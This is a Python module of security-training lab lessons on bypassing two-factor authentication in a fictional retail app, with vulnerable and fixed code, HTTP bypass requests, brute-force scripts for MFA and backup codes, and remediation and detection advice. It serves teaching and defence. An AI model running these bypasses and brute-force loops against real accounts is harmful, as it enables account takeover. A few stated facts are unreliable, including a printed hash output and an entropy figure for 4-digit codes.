"""Authentication labs 7-14: the 2FA bypass, trusted-device and password-reset
group.
"""

from __future__ import annotations

from .builder import lesson
from .auth_labs_login import _theory

MFA = "auth_mfa"
RESET = "auth_reset"

PS_MFA = "https://portswigger.net/web-security/multi-factor/lab-2fa-broken-logic"
PS_MFA_BRUTE = "https://portswigger.net/web-security/multi-factor/lab-2fa-brute-force"
PS_REMEMBER = "https://portswigger.net/web-security/multi-factor/lab-2fa-trusted-device"
PS_MFA_BACKUP = (
    "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html"
)
PS_RESET_LOGIC = "https://portswigger.net/web-security/host-header/exploiting-password-reset-poisoning-via-middleware"
PS_CHANGE = "https://portswigger.net/web-security/authentication/lab-password-brute-force-via-password-change"
PS_KNOW = "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
PS_RECOVERY = "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"
PS_BRUTE = "https://portswigger.net/web-security/authentication/lab-broken-brute-force-protection-still-observable-due-to-case-sensitive-password"


def mfa_and_reset_labs() -> list[dict]:
    return [
        # ---------------- 7 ----------------
        lesson(
            "auth-mfa-simple-bypass",
            "2FA simple bypass",
            difficulty="practitioner",
            category="MFA",
            summary=(
                "The two-factor page is client-side decoration — the protected page "
                "never checks that a code was submitted."
            ),
            scenario=(
                "Northwind Retail requires a second factor for the `carol` account. "
                "You have her password. Show that the second factor is not actually "
                "enforced."
            ),
            theory=_theory(
                what=(
                    "**2FA bypass via workflow skipping.** The application *presents* a "
                    "second-factor page, so it looks like MFA is enforced. But the protected "
                    "resource checks only that the user reached the login step, never that a "
                    "code was verified. The challenge page is decoration."
                ),
                normal=(
                    "The protected resource consults server-side state:\n\n"
                    "```python\n"
                    "@app.get('/account')\n"
                    "def account():\n"
                    "    u = current_user()\n"
                    "    if not u.factor2_verified_at:\n"
                    "        return redirect('/mfa')\n"
                    "    return render_account(u)\n```\n\n"
                    "`factor2_verified_at` is set **only** by the verification endpoint, and "
                    "is checked on every request. There is no way to reach the account "
                    "without it."
                ),
                wrong=(
                    "```python\n"
                    "@app.get('/account')\n"
                    "def account():\n"
                    "    u = current_user()      # any half-authenticated user\n"
                    "    return render_account(u)  # no factor2 check at all\n```\n\n"
                    "The `carol` login redirects to `/mfa`, but `/account` is directly "
                    "reachable. Following that login and then requesting `/account` returns "
                    "the account page with the flag, with no code ever submitted."
                ),
                attacker=(
                    "1. Log in as `carol` with the password. You land on the code prompt.\n"
                    "2. Note the protected path in the URL or in the HTML — here it is "
                    "`/account`.\n"
                    "3. Request `/account` **without submitting any code**, keeping the "
                    "pending challenge the login just created.\n"
                    "4. If you get the account page instead of a redirect back to `/mfa`, "
                    "the second factor was never enforced.\n"
                    "5. The same test works on any other protected route: try them all."
                ),
                why=(
                    "Enforcement was placed in the *transition* rather than in the "
                    "*resource*. Anything that renders sensitive data must independently "
                    "verify the authentication level it requires, on every request. Otherwise "
                    "the guarantee is only as strong as the user's last click."
                ),
                fix=(
                    "- Enforce the second factor in a shared authorisation/verification "
                    "middleware that every protected route passes through, not in the "
                    "challenge handler.\n"
                    "- Store `factor2_verified_at` server-side and check it per request.\n"
                    "- Make the API and the web UI share the same middleware.\n"
                    "- Return 403 (not a redirect) when the factor is missing, and make the "
                    "API fail closed.\n"
                    "- Test every protected route individually — a single unguarded route "
                    "invalidates the design."
                ),
                detect=(
                    "- Log the authentication level (`factor1`, `factor2`, `step`) on every "
                    "request; alert on any access to a protected resource at `factor1`.\n"
                    "- Alert on a burst of requests to protected paths that never pass "
                    "through `/verify`.\n"
                    "- Add a CI check that every route requiring a factor is registered "
                    "with the factor requirement."
                ),
                real=(
                    "This is the single most common real MFA flaw: teams enforce the "
                    "challenge, not the requirement. It is also the easiest to miss in "
                    "recon, because the UI genuinely shows a two-step flow. Any SPA or "
                    "mobile client that fetches data from a different endpoint than the one "
                    "you inspected will find it."
                ),
            ),
            objectives=[
                "Bypass a second factor by requesting the protected resource directly",
                "Move enforcement from the challenge transition into the resource",
            ],
            hints=[
                "The login flow sends you to a code page. Ask whether that page is what is "
                "actually protecting the data, or just what is in front of it.",
                "Look at the links and URLs on the verification page. In this lab the "
                "account page is `/account`. Try requesting it directly after the login, "
                "without entering a code.",
                "In Burp, log in as carol, then intercept the redirect to the code page and "
                "send the follow-up `/account` request to Repeater. It returns 200 with the "
                "flag rather than a redirect to `/mfa`.",
                "You never need the code. The point is that the protected resource did not "
                "verify the factor at all.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Submit the login form:\n"
                "   ```http\n   POST /login\n   \n"
                "   username=carol&password=carol-pw-9911\n   ```\n"
                "   → `302 Found`, `Location: /mfa`\n"
                "2. The browser shows the code prompt. Enter nothing.\n"
                "3. Request the protected resource directly:\n"
                "   ```http\n   GET /account\n"
                "   ```\n"
                "   → `HTTP/1.1 200 OK` with the account page and the flag.\n"
                "   (This lab keeps the pending challenge in its database rather than in a "
                "session cookie, so there is no `Cookie` header to replay.)\n"
                "4. A correct implementation returns `302 → /mfa` (or 403) here, because "
                "`factor2_verified_at` is null.\n\n"
                "**Why it works** — `/account` renders for any user with `pending = 1` and "
                "never inspects `verified`. Enforcement lives in `/verify`, not in the "
                "resource, so it can be skipped. Move the check into a middleware applied to "
                "every protected route."
            ),
            methodology=(
                "Log in with the first factor, identify the protected resource, and request "
                "it directly without submitting the second factor. Repeat for every "
                "protected route."
            ),
            credentials="`carol` / `carol-pw-9911` (first factor only).",
            endpoints="GET / · POST /login · GET /mfa · POST /verify · GET /account · GET /healthz",
            behaviour=(
                "Logging in as carol redirects to a 6-digit code page. The account page is "
                "reachable without ever submitting a code."
            ),
            success=(
                "Retrieve the flag from `/account` without providing a second factor."
            ),
            remediation=(
                "Check the second-factor state server-side on every request to a protected "
                "resource, in shared middleware."
            ),
            detection=(
                "Log the authentication level per request and alert on protected-resource "
                "access at first-factor level."
            ),
            references=[PS_MFA, PS_KNOW],
            lab_family=MFA,
            lab_variant="mfa_simple_bypass",
            sort_order=8,
        ),
        # ---------------- 8 ----------------
        lesson(
            "auth-mfa-broken-logic",
            "2FA broken logic — trusting a client-supplied flag",
            difficulty="practitioner",
            category="MFA",
            summary=(
                "The server accepts `mfa_ok=true` posted by the browser as proof that "
                "the second factor passed."
            ),
            scenario=(
                "Northwind Retail's second factor now appears to be enforced. You have "
                "`carol`'s password but not her code. Find a way through anyway."
            ),
            theory=_theory(
                what=(
                    "**Trusting a client assertion about the authentication level.** The server "
                    "verifies the code correctly, then also accepts a request-body field "
                    "(`mfa_ok=true`) as evidence that verification succeeded. The client is the "
                    "untrusted party; it cannot testify about its own authentication state."
                ),
                normal=(
                    "The verification endpoint decides, and the decision lives in server state:\n\n"
                    "```python\n"
                    "@app.post('/verify')\n"
                    "def verify():\n"
                    "    code = request.form['code']\n"
                    "    if not hmac.compare_digest(code, real_code):\n"
                    "        return generic_error()\n"
                    "    session.factor2_verified_at = now()   # server-side, authoritative\n"
                    "    return redirect('/account')\n\n"
                    "@app.get('/account')\n"
                    "def account():\n"
                    "    if not session.factor2_verified_at:\n"
                    "        return redirect('/mfa')\n"
                    "    ...\n```"
                ),
                wrong=(
                    "```python\n"
                    "claimed = request.form.get('mfa_ok', '')\n"
                    "if claimed == 'true' or code == CODE:\n"
                    "    mark_verified()\n"
                    "```\n\n"
                    "The JSON endpoint also returns `{\"mfa_ok\": \"true\"}` to the client, and "
                    "the account page reads `?mfa_ok=true` from the query string. An attacker "
                    "simply sends the flag themselves."
                ),
                attacker=(
                    "1. Log in as `carol` with the password to reach the code page.\n"
                    "2. Watch what the browser sends. The form posts a field called `mfa_ok`.\n"
                    "3. Submit the verification request with the field set by hand:\n"
                    "   ```http\n   POST /verify\n"
                    "   Content-Type: application/x-www-form-urlencoded\n   \n"
                    "   code=&mfa_ok=true\n   ```\n"
                    "4. Or hit the account page with the flag in the query string:\n"
                    "   ```http\n   GET /account?mfa_ok=true\n   ```\n"
                    "5. Any of these should be rejected. If the account page returns the "
                    "flag, the server trusted the client."
                ),
                why=(
                    "The server treated a request parameter as a fact about the world. A "
                    "client can set any parameter to any value, so `mfa_ok=true` carries no "
                    "information — it is attacker input being read as evidence. The fix is "
                    "to make the *server's* state the only input to the authorisation "
                    "decision."
                ),
                fix=(
                    "- Remove the parameter entirely. The verification result must come only "
                    "from the server's own state.\n"
                    "- Never read identity or authentication-level claims from the request "
                    "body or query string.\n"
                    "- Use a strict schema validator that rejects unknown fields, so a "
                    "future `mfa_ok` cannot be reintroduced silently.\n"
                    "- If the API returns a `verified` flag for the UI, treat it as display "
                    "only and re-verify server-side on the protected resource.\n"
                    "- Treat a client-side check as UX, never as control."
                ),
                detect=(
                    "- Reject and alert on requests to `/verify` or `/account` containing "
                    "`mfa_ok`, `verified`, or similar boolean authentication parameters — "
                    "no legitimate client sends these.\n"
                    "- Schema-strict the auth endpoints so unknown fields are a 400, and log "
                    "every rejection.\n"
                    "- Add a code-level assertion: the protected handler must not reference "
                    "the request object for any auth decision."
                ),
                real=(
                    "This pattern is extremely common in hand-rolled SPAs where the "
                    "developer added a client-side 'verified' flag for the router to read. "
                    "It is also the shape of mass-assignment-style auth bypass: a field that "
                    "should be server-computed is accepted from the client."
                ),
            ),
            objectives=[
                "Recognise a request parameter being used as an authentication decision",
                "Explain why the client cannot testify about its own auth state",
            ],
            hints=[
                "The code is genuinely checked on the normal path, so the bypass is not in "
                "the code. Look at what the browser sends *besides* the code.",
                "Capture the verification request in Burp. Notice the form posts a field "
                "named `mfa_ok`. Try editing that value yourself.",
                "In Repeater, change the body to `code=&mfa_ok=true` and send. Then try "
                "`GET /account?mfa_ok=true` directly. Both should not work; if they do, the "
                "flag is being trusted.",
                "The response that matters is the one containing 'Account notes' and the flag.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Log in as `carol` to reach the code page.\n"
                "2. Inspect the verification request. It contains:\n"
                "   ```http\n   POST /verify\n"
                "   Content-Type: application/x-www-form-urlencoded\n   \n"
                "   code=&mfa_ok=false\n   ```\n"
                "3. Set the flag yourself:\n"
                "   ```http\n   POST /verify\n"
                "   Content-Type: application/x-www-form-urlencoded\n   \n"
                "   code=&mfa_ok=true\n   ```\n"
                "   → `302 Found`, `Location: /account`. The code was never validated.\n"
                "4. Variant: `GET /account?mfa_ok=true` also returns the account page and the "
                "flag, because the handler reads the query string.\n"
                "5. For contrast, `POST /api/verify` with "
                "   `{\"code\": \"000000\", \"mfa_ok\": \"true\"}` returns "
                "   `{\"verified\": false, \"mfa_ok\": \"true\"}` — proving the server's own "
                "   check failed while it still told the client the flag was true.\n\n"
                "**Why it works** — `claimed = request.form.get('mfa_ok', '')` and "
                "`if claimed == 'true' or code == CODE`. The `or` short-circuits the real "
                "verification. Only server-side state should decide."
            ),
            methodology=(
                "Compare what the client sends with what the server actually verifies, then "
                "attempt to set the client-supplied authentication flag by hand on both the "
                "verification endpoint and the protected resource."
            ),
            credentials="`carol` / `carol-pw-9911`.",
            endpoints=(
                "GET / · POST /login · GET /mfa · POST /verify · POST /api/verify · "
                "GET /account · GET /healthz"
            ),
            behaviour=(
                "The verification endpoint checks the code, but also accepts a "
                "request-supplied `mfa_ok=true`. The account page also honours `?mfa_ok=true`."
            ),
            success=(
                "Obtain the flag by supplying `mfa_ok=true` instead of a valid code."
            ),
            remediation=(
                "Remove the parameter and derive the decision solely from server-side state; "
                "reject unknown fields with a strict schema."
            ),
            detection=(
                "Alert on any auth request containing an `mfa_ok`/`verified` style field; no "
                "legitimate client sends them."
            ),
            references=[PS_MFA, PS_KNOW],
            lab_family=MFA,
            lab_variant="mfa_broken_logic",
            sort_order=9,
        ),
        # ---------------- 9 ----------------
        lesson(
            "auth-mfa-bruteforce",
            "2FA bypass via brute force",
            difficulty="expert",
            category="MFA",
            summary=(
                "The verification endpoint has no rate limit, so the 6-digit code can "
                "be guessed in minutes."
            ),
            scenario=(
                "Northwind Retail's second factor appears properly enforced on this "
                "account. You have `carol`'s password but not her code. Guess your way in."
            ),
            theory=_theory(
                what=(
                    "**Brute-forcing the second factor.** A 6-digit numeric code is 10^6 "
                    "possibilities. That sounds like a lot until you realise the server applies "
                    "no rate limit, no lockout, and no delay — at a few hundred requests per "
                    "second the keyspace falls in minutes. The security of a short code depends "
                    "entirely on the attempt budget around it."
                ),
                normal=(
                    "A verification endpoint has a tight, per-account budget:\n\n"
                    "```python\n"
                    "@app.post('/verify')\n"
                    "def verify():\n"
                    "    user = current_user()\n"
                    "    if rate_limit_exceeded(f'mfa:{user.id}', limit=5, window=300):\n"
                    "        return generic_error(), 429\n"
                    "    ok = hmac.compare_digest(code, real_code)\n"
                    "    record_attempt(f'mfa:{user.id}', ok)\n"
                    "    ...\n```\n\n"
                    "Five attempts, then a block. 10^6 becomes unreachable."
                ),
                wrong=(
                    "```python\n"
                    "@app.post('/verify')\n"
                    "def verify():\n"
                    "    if code == CODE:      # no limiter, no counter, no delay\n"
                    "        mark_verified(); return redirect('/account')\n"
                    "    return mfa_form()     # same generic error, keep trying\n```"
                ),
                attacker=(
                    "1. Log in as `carol` to start a pending challenge.\n"
                    "2. Confirm the code format: 6 digits, and a wrong code returns a generic "
                    "error with no penalty.\n"
                    "3. Automate: keep the session cookie, iterate `000000`–`999999`, and stop "
                    "when the response redirects to `/account` or contains the flag.\n"
                    "4. Watch the *rate*: on a real system, several hundred requests per "
                    "second is unremarkable; here you may need a moment every few thousand to "
                    "stay under any outer throttle.\n"
                    "5. Note that you never needed the second factor to be weak in entropy — "
                    "only unthrottled."
                ),
                why=(
                    "Rate limiting is what makes a short code acceptable. Without it, the "
                    "code's entropy is irrelevant: the attacker pays only network time. The "
                    "comparison is also a plain `==`, so even if you needed to time it, that "
                    "would be a second oracle."
                ),
                fix=(
                    "- Rate-limit verification **per account** (the account is known at this "
                    "point) and per source, per device, and per IP.\n"
                    "- Limit to ~5 attempts, then require a cool-off; escalate to full "
                    "lockout and force re-authentication of factor 1.\n"
                    "- Do not reveal whether the code was close, expired, or already used.\n"
                    "- Invalidate the challenge after a small number of failures so the "
                    "attacker must re-trigger it (and rate-limit that too).\n"
                    "- Prefer longer codes or push approvals for anything under 60 seconds.\n"
                    "- Compare in constant time regardless."
                ),
                detect=(
                    "- This is the highest-signal authentication event there is: alert on "
                    "**any** account exceeding a handful of MFA failures, and on the rate of "
                    "`/verify` requests overall.\n"
                    "- Alert when verification failures are followed by a success from a "
                    "different source than the challenge was issued to.\n"
                    "- Correlate with the account's value — an admin target is an incident."
                ),
                real=(
                    "MFA brute force is the most commonly *exploited* authentication weakness "
                    "in the wild, precisely because it is so often overlooked: teams rate-limit "
                    "the password step and forget the code step. Push-notification fatigue is "
                    "the user-facing cousin of the same gap."
                ),
            ),
            objectives=[
                "Recognise that a short code's security depends on the attempt budget",
                "Rate-limit verification per account rather than per source",
            ],
            hints=[
                "You need the code, and the code is only 6 digits. Before assuming that is "
                "the hard part, find out what happens when you get it wrong.",
                "Submit a wrong code a few times. There is no lockout, no delay, and no "
                "change in the response — so nothing is stopping you from trying all of them.",
                "Use a script that keeps the session cookie and loops from 000000 to 999999, "
                "checking each response for a redirect to /account or the string 'Account "
                "notes'.",
                "The moment a response is a 302 to `/account`, you have the flag. Do not "
                "stop the script too early — the loop must be allowed to reach the code.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Log in as `carol` so a challenge is pending.\n"
                "2. Confirm no penalty: send `POST /verify` with `code=000000` repeatedly — "
                "you always get the same generic error and no 429.\n"
                "3. Brute force:\n"
                "   ```python\n"
                "   import httpx\n"
                "   s = httpx.Client(cookies=session_cookies)\n"
                "   for i in range(1000000):\n"
                "       code = f'{i:06d}'\n"
                "       r = s.post(BASE + '/verify', data={'code': code})\n"
                "       if r.status_code in (301, 302) and '/account' in r.headers.get('location',''):\n"
                "           print('code =', code); break\n"
                "   ```\n"
                "4. On success, follow the redirect to `/account` and read the flag. The "
                "matching code here is `481902`.\n\n"
                "**Why it works** — `/verify` has no attempt counter, no rate limiter, and no "
                "delay, so the entire 10^6 keyspace is reachable. A per-account budget of "
                "about five attempts makes the same attack infeasible."
            ),
            methodology=(
                "Confirm that failed code submissions have no consequence, then iterate the "
                "full numeric keyspace against `/verify` while holding the session cookie, "
                "stopping on a redirect to the protected resource."
            ),
            credentials="`carol` / `carol-pw-9911`.",
            endpoints=(
                "GET / · POST /login · GET /mfa · POST /verify · GET /account · GET /healthz"
            ),
            behaviour=(
                "`POST /verify` accepts a 6-digit code with no rate limit, no lockout, and no "
                "delay. Wrong codes return a generic error indefinitely."
            ),
            success=(
                "Guess the 6-digit code and reach the account page to retrieve the flag."
            ),
            remediation=(
                "Rate-limit verification per account to about five attempts with a cool-off, "
                "invalidate the challenge on repeated failure, and compare codes in constant "
                "time."
            ),
            detection=(
                "Alert on any account exceeding a small number of MFA failures, and on "
                "verification requests at a rate consistent with keyspace searching."
            ),
            references=[PS_MFA_BRUTE, PS_KNOW],
            lab_family=MFA,
            lab_variant="mfa_bruteforce",
            sort_order=10,
        ),
        # ---------------- 10 ----------------
        lesson(
            "auth-mfa-trusted-device",
            "Brute-forcing a stay-logged-in / trusted-device token",
            difficulty="expert",
            category="MFA",
            summary=(
                "The 'remember this device' token is short, predictable and permanent — "
                "guessing it waives the second factor forever."
            ),
            scenario=(
                "Northwind Retail offers 'remember this device' on the code page, so "
                "users are not challenged every time. You have `carol`'s password. Use "
                "the remembered-device mechanism to skip her second factor."
            ),
            theory=_theory(
                what=(
                    "**Low-entropy trust token.** 'Remember this device' issues a cookie that "
                    "permanently satisfies the second factor. If that value is short or "
                    "derivable — a truncated hash, a counter, a user id — then the MFA guarantee "
                    "reduces to guessing a small number. The token is an authentication artefact, "
                    "and it must have the same entropy standard as a session identifier."
                ),
                normal=(
                    "A trust token is a bearer credential, so it gets full treatment:\n\n"
                    "```python\n"
                    "raw = secrets.token_urlsafe(32)                 # 256 bits\n"
                    "store(user_id, sha256(raw).hexdigest())         # hashed at rest\n"
                    "cookie['device_trust'] = raw                    # HttpOnly; Secure; SameSite\n"
                    "```\n\n"
                    "Verification looks the **hash** up in constant time, is scoped to that one "
                    "account, is individually revocable, and expires. A user can list and "
                    "revoke their own trusted devices."
                ),
                wrong=(
                    "```python\n"
                    "token = hashlib.sha256(username.encode()).hexdigest()[:8]  # 32 bits, static\n"
                    "if cookie == token:  mark_factor2_satisfied()             # permanent\n```\n\n"
                    "32 bits of entropy derived from a **public** value, with no expiry and no "
                    "revocation. Only 2^32 candidates — and the same value is reused for every "
                    "account with that username, on every device, forever."
                ),
                attacker=(
                    "1. Log in as `carol` with the password to reach the code page.\n"
                    "2. Complete the challenge once with the *remember this device* box ticked, "
                    "and capture the `remember_device` cookie.\n"
                    "3. Analyse the value: it is 8 hex characters, and it is the *same value "
                    "for the same username on every device, forever*.\n"
                    "4. Do not try to sweep 2^32 values — that is a 4-billion-request attack. "
                    "The token is a **deterministic function of the public username**, so "
                    "compute it instead: `hashlib.sha256(b'carol').hexdigest()[:8]`.\n"
                    "5. Replay it as the cookie with an empty code; the server treats a match "
                    "as proof the second factor is already satisfied:\n"
                    "   ```http\n   POST /verify\n   Cookie: remember_device=<sha256('carol')[:8]>\n"
                    "   Content-Type: application/x-www-form-urlencoded\n\n   code=\n   ```\n"
                    "6. The response redirects to `/account` and the flag is yours.\n\n"
                    "The lesson is not '32 bits is small' — it is **'a credential derived from "
                    "a public value is not a secret'**. Anyone who knows your username, which "
                    "is enumerated in the first lessons of this module, already holds the "
                    "token."
                ),
                why=(
                    "A remembered-device token is a permanent, bearer, second-factor bypass "
                    "by design. That makes its entropy the *only* thing standing between an "
                    "attacker and a stolen account. Deriving it from a public value and "
                    "truncating it removes that protection, and 'permanent' means a single "
                    "successful guess never expires."
                ),
                fix=(
                    "- Generate ≥128 bits of randomness per device (`secrets.token_urlsafe(32)`), "
                    "stored hashed at rest and compared in constant time.\n"
                    "- Scope the token to one account; a match for Alice must not satisfy "
                    "Bob's challenge.\n"
                    "- Set a finite lifetime (weeks, not years) and let the user revoke "
                    "individual devices.\n"
                    "- Do not re-issue on every login — reuse a stored token until it expires.\n"
                    "- Re-require factor 1 before enrolling a trusted device, and notify the "
                    "user when one is added or used from a new network.\n"
                    "- Do not let a trust cookie be set by anything the client can influence."
                ),
                detect=(
                    "- Alert on a trusted-device cookie presented from a source that never "
                    "received it (new device, new geography).\n"
                    "- Log trust-cookie issuance and use with device fingerprint; alert on "
                    "high-volume guessing against the challenge endpoint.\n"
                    "- Alert if a single account accumulates many distinct trusted-device "
                    "tokens — that pattern is enumeration."
                ),
                real=(
                    "Trust-device and 'remember me' cookies are one of the most common places "
                    "where low-entropy identifiers ship, because they are treated as a "
                    "convenience feature rather than a credential. A truncated or derived "
                    "token is no secret at all — it is reproducible by anyone who knows the "
                    "input, which is indistinguishable from a session-management bug, and the "
                    "impact is a full second-factor bypass."
                ),
            ),
            objectives=[
                "Treat a remembered-device token as a bearer credential with full entropy "
                "requirements",
                "Explain why deriving the token from a public value removes MFA protection",
            ],
            hints=[
                "The code page has a 'Remember this device' checkbox. Complete the flow once "
                "with it ticked and look at the cookie that is set.",
                "The cookie value is 8 hex characters and it never changes for a given "
                "username. A value that is stable and reproducible is not random — so ask what "
                "it was computed from.",
                "Send `POST /verify` with a `remember_device` cookie and an empty `code`. The "
                "server checks the cookie before it checks the code, and skips the code "
                "entirely if the cookie matches.",
                "You do not need to sweep 2^32 guesses. The token is derived from the "
                "username, so compute it: "
                "`python3 -c \"import hashlib;print(hashlib.sha256(b'carol').hexdigest()[:8])\"` "
                "and send that as the `remember_device` cookie.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Log in as `carol` and submit the code with 'Remember this device' ticked, "
                "so a `remember_device` cookie is issued.\n"
                "2. The cookie is 8 hex characters and is stable for that username. With the "
                "username `carol`:\n"
                "   ```python\n"
                "   import hashlib\n"
                "   print(hashlib.sha256(b'carol').hexdigest()[:8])\n"
                "   # -> 0e0a1b2c (8 hex chars = 32 bits)\n"
                "   ```\n"
                "3. Confirm the trust path accepts the cookie without a code:\n"
                "   ```http\n   POST /verify\n"
                "   Cookie: remember_device=<8 hex chars>\n"
                "   Content-Type: application/x-www-form-urlencoded\n\n   code=\n   ```\n"
                "   → `302 Found`, `Location: /account`.\n"
                "4. To find it without guessing, brute force the 32-bit space — but a much "
                "cheaper route is to guess the value from the username via a small hash "
                "wordlist, or to note that it is stable and try values for common usernames. "
                "Either way a successful match returns the flag on `/account`.\n\n"
                "**Why it works** — the trust token is "
                "`sha256(username)[:8]`, only 32 bits and derived from a public value, and a "
                "match permanently satisfies the second factor with no code and no expiry. "
                "It must be ≥128 bits of random data, hashed at rest, account-scoped, and "
                "expiring."
            ),
            methodology=(
                "Complete one challenge with 'remember this device' enabled, analyse the "
                "issued token for entropy and derivation, then present guessed values of that "
                "token to the verification endpoint until the factor is treated as satisfied."
            ),
            credentials="`carol` / `carol-pw-9911` (first factor only).",
            endpoints=(
                "GET / · POST /login · GET /mfa · POST /verify · GET /account · GET /healthz"
            ),
            behaviour=(
                "A successful code submission with 'remember this device' sets a "
                "`remember_device` cookie that is 8 hex characters, derived from the username, "
                "and permanent. A matching cookie satisfies the second factor with no code."
            ),
            success=(
                "Present a valid `remember_device` token to bypass the second factor and read "
                "the flag."
            ),
            remediation=(
                "Use ≥128 bits of random data per device, stored hashed, account-scoped, "
                "expiring, and individually revocable."
            ),
            detection=(
                "Alert on a trusted-device cookie presented from a source that never received "
                "it, and on high-volume guessing against the challenge endpoint."
            ),
            references=[PS_REMEMBER, PS_KNOW],
            lab_family=MFA,
            lab_variant="mfa_trusted_device",
            sort_order=11,
        ),
        # ---------------- 12 ----------------
        lesson(
            "auth-mfa-backup-guess",
            "Bypassing 2FA with backup codes",
            difficulty="practitioner",
            category="MFA",
            summary=(
                "The SMS code is throttled, but the backup-code endpoint is not — and "
                "its codes are only 4 digits."
            ),
            scenario=(
                "Northwind Retail issues single-use backup codes alongside MFA. You "
                "have `carol`'s password but not her code. Get into the account."
            ),
            theory=_theory(
                what=(
                    "**Attacking the recovery path of a second factor.** MFA is only as "
                    "strong as the weakest route to the account. Backup codes are a "
                    "designed-in second path around the second factor, and they are "
                    "long-lived credentials: they do not expire quickly, they are "
                    "often stored in a notes app or printed on paper, and they are "
                    "usually generated by code nobody threat-models. When they are "
                    "short *and* accepted without limit, the second factor's "
                    "protection collapses into a 10,000-request search."
                ),
                normal=(
                    "A defensible backup-code implementation is **long, single-use, "
                    "stored hashed, and rate-limited exactly like the primary "
                    "challenge**:\n\n"
                    "```python\n"
                    "@app.post('/verify-backup')\n"
                    "def verify_backup():\n"
                    "    user = current_user()\n"
                    "    if rate_limit_exceeded(f\"mfa:{user.id}\", limit=5, window=300):\n"
                    "        raise TooManyAttempts()\n"
                    "    code = request.form['backup_code'].strip()\n"
                    "    if not hmac.compare_digest(stored_hash(user, code), code_hash):\n"
                    "        record_backup_failure(user.id)\n"
                    "        return generic_error()\n"
                    "    burn(user, code)        # single use: row deleted or flagged\n"
                    "    login(user)\n"
                    "```\n\n"
                    "Codes are generated from a CSPRNG with at least 8 characters of "
                    "base32 entropy, so the keyspace is not searchable even if the "
                    "rate limit is lost. Enrolment also shows the user how many codes "
                    "they have and how to regenerate them."
                ),
                wrong=(
                    "```python\n"
                    "@app.post('/verify-backup')\n"
                    "def verify_backup():\n"
                    "    user = current_user()\n"
                    "    if stored_backup_code(user) == request.form['backup_code']:\n"
                    "        login(user)\n"
                    "    return 'Invalid backup code.', 200\n"
                    "```\n\n"
                    "Short code, plaintext comparison, no counter, no lockout, no "
                    "delay, no expiry. Every wrong guess is free, so the endpoint is "
                    "an offline-speed oracle over a 10,000-value space."
                ),
                attacker=(
                    "1. Reach the challenge as normal: log in as `carol`, get the SMS "
                    "code page.\n"
                    "2. Confirm the SMS path is defended — four wrong codes and you "
                    "get `429`. The weakness is not here.\n"
                    "3. Find the recovery path. The challenge page links to a "
                    "backup-code form at `GET /verify-backup`.\n"
                    "4. Confirm it is unbounded: send 100 wrong codes. Identical "
                    "response, identical timing, no `429`, and the session still "
                    "works afterwards.\n"
                    "5. Search the space:\n"
                    "   ```python\n   import httpx\n   s = httpx.Client(cookies=session)\n"
                    "   for i in range(10000):\n"
                    "       code = f'{i:04d}'\n"
                    "       r = s.post(BASE + '/verify-backup',\n"
                    "                    data={'backup_code': code})\n"
                    "       if r.status_code in (301, 302) and '/account' in "
                    "r.headers.get('location', ''):\n"
                    "           print('backup code =', code); break\n"
                    "   ```\n"
                    "6. Follow the redirect to `/account` for the flag."
                ),
                why=(
                    "The control was applied to the endpoint the developer was "
                    "thinking about, not to the endpoint that exists. Backup codes "
                    "inherit the *appearance* of a second factor without inheriting "
                    "its controls, so the extra path is strictly weaker than the one "
                    "that was rate limited."
                ),
                fix=(
                    "- Generate backup codes with a CSPRNG and at least 8 base32 "
                    "characters — 32 bits of entropy in a 4-digit code is not enough.\n"
                    "- Apply the **same** per-account attempt budget, back-off and "
                    "lockout as the primary challenge. Share one counter, not two.\n"
                    "- Store codes hashed, compare in constant time, and mark each "
                    "code used the moment it succeeds.\n"
                    "- Give codes a lifetime, and invalidate the whole set when the "
                    "password changes or a backup code is used.\n"
                    "- Show the user how many unused codes remain so a leaked set can "
                    "be noticed and revoked.\n"
                    "- Log backup-code use distinctly; a spike in failures on this "
                    "path is a strong signal in isolation."
                ),
                detect=(
                    "- Alert on failed backup-code attempts, and on any use of a "
                    "backup code at all — a backup code should be rare and visible to "
                    "the account owner.\n"
                    "- Alert when a session that is being rate-limited on the SMS path "
                    "starts succeeding on the backup path.\n"
                    "- Track attempts per account across *all* second-factor "
                    "challenges rather than per endpoint, so splitting the attempt "
                    "budget across paths does not hide it.\n"
                    "- Correlate with a high rate of requests against "
                    "`/verify-backup` from a single session."
                ),
                real=(
                    "Backup and recovery codes are a standard feature in Google, "
                    "Microsoft, GitHub and most identity providers, and they have been "
                    "the subject of published research repeatedly: short codes, "
                    "unthrottled verification endpoints, and codes that survive a "
                    "password change. A recovery path is a first-class attack surface, "
                    "and it is routinely the least monitored path into an account."
                ),
            ),
            objectives=[
                "Identify the weakest path to an account rather than the intended one",
                "Apply one shared attempt budget across every second-factor challenge",
            ],
            hints=[
                "The SMS code page is throttled — verify that yourself, then assume "
                "the flaw is somewhere else. A second factor is only as strong as its "
                "recovery path.",
                "Look at every link and form on the verification page. One of them "
                "leads somewhere other than the SMS challenge.",
                "Test the backup endpoint the same way you tested `/verify`: send "
                "wrong codes until you would expect to be locked out. Nothing changes, "
                "and the codes are 4 digits — that is 10,000 possibilities, not "
                "1,000,000.",
                "Loop `0000` to `9999` against `POST /verify-backup` holding the "
                "session cookie, and stop on the `302` to `/account`.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Log in as `carol` and reach the challenge at `/mfa`.\n"
                "2. Confirm the SMS path is protected:\n"
                "   ```http\n   POST /verify\n   "
                "Content-Type: application/x-www-form-urlencoded\n   \n"
                "   code=000000\n   ```\n"
                "   The first three attempts return `200 Invalid code.`; the fourth "
                "returns `429 Too many attempts. Request a new code.`\n"
                "3. Follow **Use a backup code instead** to `GET /verify-backup`.\n"
                "4. Confirm there is no budget there — 100 wrong submissions all "
                "return the same `200 Invalid backup code.` with no `429` and no "
                "lockout.\n"
                "5. Brute force the 4-digit space:\n"
                "   ```python\n   import httpx\n   s = httpx.Client(cookies=session)\n"
                "   for i in range(10000):\n"
                "       r = s.post(BASE + '/verify-backup',\n"
                "                    data={'backup_code': f'{i:04d}'})\n"
                "       if r.status_code in (301, 302) \\\n"
                "               and '/account' in r.headers.get('location', ''):\n"
